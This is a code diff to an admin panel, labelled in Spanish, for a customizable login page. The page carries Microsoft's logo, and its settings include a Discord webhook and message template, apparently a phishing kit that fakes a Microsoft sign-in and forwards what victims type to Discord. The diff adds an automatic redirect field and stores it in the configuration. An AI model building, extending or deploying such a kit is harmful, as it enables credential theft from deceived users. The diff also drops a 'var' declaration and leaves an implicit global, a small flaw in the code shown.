@@ -427,8 +427,15 @@
           <input type="text" id="loginTitle" value="Iniciar sesión">
         </div>
         <div class="form-group">
-          <label>Descripción (opcional)</label>
+          <label for="loginDescription">Descripción (opcional)</label>
           <input type="text" id="loginDescription" placeholder="Ingrese una descripción opcional para la página de login">
+        </div>
+        <div class="form-group">
+          <label for="redirectUrl">Redirección automática (opcional)</label>
+          <input type="url" id="redirectUrl" placeholder="https://ejemplo.com/pagina">
+          <div class="preview-box" style="font-size: 11px; color: #9a6700;">
+            Al abrir el login, redirige automáticamente a este link. Déjalo vacío para desactivar.
+          </div>
         </div>
         <div class="preview-box" id="preview-content">
           <img id="logoPreview" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" style="height: 32px; display: none;">
@@ -530,6 +537,7 @@
       document.getElementById('loginLogo').value = config.loginLogo || '';
       document.getElementById('loginTitle').value = config.loginTitle || 'Iniciar sesión';
       document.getElementById('loginDescription').value = config.loginDescription || '';
+      document.getElementById('redirectUrl').value = config.redirectUrl || '';
       document.getElementById('discordWebhook').value = config.discordWebhook || '';
       document.getElementById('discordMessageTemplate').value = config.discordMessageTemplate || '';
       document.getElementById('adminPassword').value = config.adminPassword || 'admin123';
@@ -603,7 +611,7 @@
       saveBtn.textContent = 'Guardando...';
       saveBtn.disabled = true;
 
-      var updates = {
+      updates = {
         loginBgType: document.getElementById('loginBgType').value,
         loginBgImage: document.getElementById('loginBgImage').value,
         loginBgColor: document.getElementById('loginBgColor').value,
@@ -611,6 +619,7 @@
         loginLogo: document.getElementById('loginLogo').value,
         loginTitle: document.getElementById('loginTitle').value,
         loginDescription: document.getElementById('loginDescription').value,
+        redirectUrl: document.getElementById('redirectUrl').value,
         discordWebhook: document.getElementById('discordWebhook').value,
         discordMessageTemplate: document.getElementById('discordMessageTemplate').value,
         adminPassword: document.getElementById('adminPassword').value,
